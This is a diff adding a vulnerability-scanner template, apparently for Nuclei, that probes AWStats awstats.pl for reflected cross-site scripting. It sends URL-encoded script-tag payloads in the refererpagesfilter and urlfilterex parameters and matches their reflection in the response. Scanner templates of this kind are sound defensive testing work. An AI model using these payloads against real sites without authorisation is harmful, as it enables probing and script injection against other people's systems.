@@ -1,0 +1,29 @@
+id: AWStats-4XSS
+
+info:
+  name: AWStats 4.0/5.x/6.x - AWStats.pl Multiple Cross-Site Scripting Vulnerabilities
+  author: osamahamad
+  severity: high
+  description: https://www.exploit-db.com/exploits/27694
+  reference: https://www.exploit-db.com/exploits/27694
+  tags: custom
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/awstats.pl?refererpagesfilter=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&refererpagesfilterex=&output=refererpages&config=unsecured-systems.com&year=2006&month=all"
+      - "{{BaseURL}}/awstats.pl?urlfilter=&urlfilterex=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&output=urlentry&config=unsecured-systems.com&year=2006&month=all"
+      - "{{BaseURL}}/awstats/awstats.pl?refererpagesfilter=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&refererpagesfilterex=&output=refererpages&config=unsecured-systems.com&year=2006&month=all"
+      - "{{BaseURL}}/awstats/awstats.pl?urlfilter=&urlfilterex=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&output=urlentry&config=unsecured-systems.com&year=2006&month=all"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"/><script>alert(1)</script>'
+        part: body 
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
